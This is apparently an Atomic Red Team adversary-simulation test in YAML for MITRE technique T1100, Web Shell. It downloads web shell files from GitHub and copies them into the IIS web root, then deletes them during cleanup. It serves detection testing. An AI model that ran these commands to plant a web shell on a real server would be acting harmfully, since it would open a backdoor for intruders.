---
attack_technique: T1100
display_name: Web Shell

atomic_tests:
- name: Web Shell Written to Disk
  description: |
    This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.
    Idea from APTSimulator.
    cmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
  supported_platforms:
    - windows
  input_arguments:
    web_shell_path:
      description: The path to drop the web shell
      type: string
      default: C:\inetpub\wwwroot
    web_shells:
      description: Path of Web Shell
      type: path
      default: PathToAtomicsFolder\T1100\src\

  dependency_executor_name: powershell
  dependencies:
    - description: |
        Web shell must exist on disk at specified location (#{web_shells})
      prereq_command: |
        if (Test-Path #{web_shells}) {exit 0} else {exit 1}
      get_prereq_command: |
        New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/" -OutFile "#{web_shells}"

  executor:
    name: command_prompt
    command: |
      xcopy #{web_shells} #{web_shell_path}
    cleanup_command: |
      del #{web_shell_path}
